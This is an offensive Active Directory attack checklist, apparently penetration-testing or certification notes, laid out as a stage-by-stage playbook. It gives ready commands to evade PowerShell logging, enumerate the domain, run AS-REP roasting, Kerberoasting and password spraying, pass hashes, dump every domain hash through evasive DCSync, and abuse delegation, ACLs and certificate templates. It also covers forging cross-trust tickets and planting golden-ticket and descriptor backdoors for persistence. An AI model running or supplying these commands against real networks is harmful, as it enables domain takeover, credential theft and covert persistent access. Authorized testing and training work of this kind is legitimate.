# Active Directory Checklist

## 1. From foothold — situational awareness
```powershell
# Start InviShell first (bypass PS logging)
C:\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Who am I, what groups
whoami /all
net user <currentuser> /domain

# Domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

## 2. Enumerate with PowerView / ADModule
```powershell
Import-Module PowerView.ps1

# Domain
Get-Domain; Get-DomainController

# Users with interesting properties
Get-DomainUser | select samaccountname, description   # check description for passwords
Get-DomainUser -SPN | select samaccountname           # kerberoastable
Get-DomainUser -PreauthNotRequired | select samaccountname  # AS-REP roastable

# Groups
Get-DomainGroup | select name
Get-DomainGroupMember "Domain Admins"

# Computers
Get-DomainComputer | select name, operatingsystem
Get-DomainComputer -Unconstrained | select name       # unconstrained delegation
Get-DomainComputer -TrustedToAuth | select name       # constrained delegation

# ACLs — who has rights over what
Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN,ActiveDirectoryRights,IdentityReferenceName
```

## 3. BloodHound
```bash
# On target (PS)
. .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp\

# On attacker
bloodhound-python -u <user> -p <pass> -d <domain> -dc <DC_IP> -c All
neo4j start && bloodhound
```
Queries to run: "Shortest path to DA", "Find AS-REP roastable", "Find Kerberoastable"

## 4. Quick wins — try in order

### AS-REP Roasting (no creds needed)
```bash
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat
hashcat -m 18200 hashes.txt rockyou.txt
```

### Kerberoasting (need any valid user)
```
Loader.exe -path Rubeus.exe -args kerberoast /simple /rc4opsec /outfile:hashes.txt
hashcat -m 13100 hashes.txt rockyou.txt
```

### Password spray
```bash
crackmapexec smb <DC_IP> -u users.txt -p 'Password123' --continue-on-success
# Try: SeasonYear!, CompanyName1, Welcome1
```

## 5. Found DA or high-priv account

### OverPass-the-Hash → spawn as DA
```
Loader.exe -path Rubeus.exe -args asktgt /user:<DA> /aes256:<hash> /opsec /createnetonly:cmd.exe /show /ptt
```

### DCSync
```
Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:<domain>\krbtgt" "exit"
```

### Dump all hashes
```
Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /domain:<domain> /all /csv" "exit"
```

## 6. Delegation paths
- Unconstrained? → coerce DC with MS-RPRN/MS-WSP + Rubeus monitor → capture DC$ TGT → DCSync
- Constrained (TrustedToAuth)? → S4U2Self+S4U2Proxy → impersonate DA
- GenericWrite on computer? → RBCD → S4U → impersonate DA

## 7. ACL abuse paths
- GenericAll/WriteDACL on user → reset password or targeted kerberoast
- GenericAll on group → add self to DA
- WriteDACL on domain → grant self DCSync rights
- GenericWrite on GPO → GPO abuse

## 8. ADCS
```
Certify.exe find /vulnerable
Certify.exe find /enrolleeSuppliesSubject
```
- ESC1: template allows SAN → request cert for DA → Rubeus asktgt
- ESC3: enrollment agent template → request on behalf of DA

## 9. Cross-domain / cross-forest
- Child → Parent: extract trust key (`lsadump::evasive-trust /patch`) → forge inter-realm TGT with /sids EA-519
- Cross-forest: same but no SID history → only reach explicitly shared resources

## 10. Persistence
- Golden ticket (krbtgt hash) — 10 year validity
- DCSync rights via ACL on domain object
- DSRM local admin on DC + reg key
- Security descriptor backdoor (RACE.ps1)
